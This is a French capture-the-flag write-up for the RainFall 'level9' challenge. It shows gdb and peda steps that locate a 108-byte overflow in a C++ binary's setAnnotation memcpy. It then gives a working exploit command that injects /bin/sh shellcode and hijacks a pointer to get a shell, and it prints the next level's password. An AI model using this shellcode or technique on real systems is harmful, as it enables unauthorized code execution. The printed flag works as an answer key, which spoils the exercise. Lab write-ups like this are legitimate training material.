## Démarches

- Avec `objdump -d --demangle level9` ou gdb et la commande `info functions`, on remarque qu'il s'agit d'un programme écrit en C++
  ```
    [...]
    0x080485f4  main
    [...]
    0x080486f6  N::N(int)
    0x080486f6  N::N(int)
    0x0804870e  N::setAnnotation(char*)
    0x0804873a  N::operator+(N&)
    0x0804874e  N::operator-(N&)
    [...]
  ```

- Le programme prend un argument. Avec peda et la fonction de pattern, on peut déduire la taille allouée pour cet argument :
  - `pattern create 200`
    > 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
  - `set args 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'`
  - `r`
  - `pattern search` (après le segfault)
    >     EAX+0 found at offset: 108

- La méthode `N::setAnnotation(char*)` fait appel à memcpy
  >  8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>

- On place un breakpoint à l'appel de la méthode `N::setAnnotation(char*)` :
  - `br *0x8048677`
  -  `set args $(python -c 'print("A"*108)')`
  - `r`
  - `info registers`
  - `x/20 0x804a008`
  - la chaine se remplit à partir de l'adresse`0x804a00c` (**`0x804a00c + 4 = 0x0804a010`**) 

- Avec un shellcode (cf level2), + padding (108 - (45 + 4))+ adresse du début de la copie

    ```
    level9@RainFall:~$ ./level9 $(python -c 'print("\x10\xa0\x04\x08"+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x90"*59+"\x0c\xa0\x04\x08")')
    $ whoami
    bonus0
    $ pwd
    /home/user/level9
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
    $ exit
    ```
<br>
----
## Ressources   
